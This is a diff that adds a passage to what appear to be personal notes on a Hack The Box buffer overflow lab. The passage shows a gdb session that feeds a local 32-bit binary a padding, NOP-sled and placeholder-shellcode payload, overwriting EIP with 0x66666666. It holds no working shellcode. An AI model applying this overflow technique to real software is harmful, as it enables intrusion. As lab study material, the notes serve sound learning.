@@ -262,6 +262,27 @@ Shellcode = "\x44" * 150
       EIP = "\x66" * 4
 ```
 
+![](../Images/Pasted%20image%2020240920125948.png)
+
+#### BGF
+
+
+```shell-session
+(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+```
+
+#### Buffer
+
+![imagen](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)
+
+Servidores VP
 
 
 
